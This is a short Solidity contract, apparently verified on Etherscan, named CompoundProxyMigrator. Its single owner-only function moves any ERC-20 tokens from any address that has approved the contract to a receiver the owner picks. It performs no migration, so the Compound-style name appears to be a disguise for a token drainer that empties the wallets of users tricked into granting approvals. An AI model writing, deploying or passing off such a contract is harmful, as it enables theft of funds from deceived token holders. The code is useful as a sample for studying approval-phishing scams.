['/**\n', ' *Submitted for verification at Etherscan.io on 2021-05-29\n', '*/\n', '\n', '// SPDX-License-Identifier: SEE LICENSE IN LICENSE\n', 'pragma solidity 0.6.12;\n', '\n', 'interface IERC20Token {\n', '    function allowance(address _owner, address _spender) external view returns (uint256);\n', '    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);\n', '}\n', '\n', 'contract CompoundProxyMigrator {\n', '    address public owner;\n', '\n', '    constructor() public {\n', '        owner = msg.sender;\n', '    }\n', '\n', '    function transferCompoundProxyMigrator(IERC20Token _token, address _sender, address _receiver, uint256 _amount) external returns (bool) {\n', '        require(msg.sender == owner, "access denied");\n', '        return _token.transferFrom(_sender, _receiver, _amount);\n', '    }\n', '}']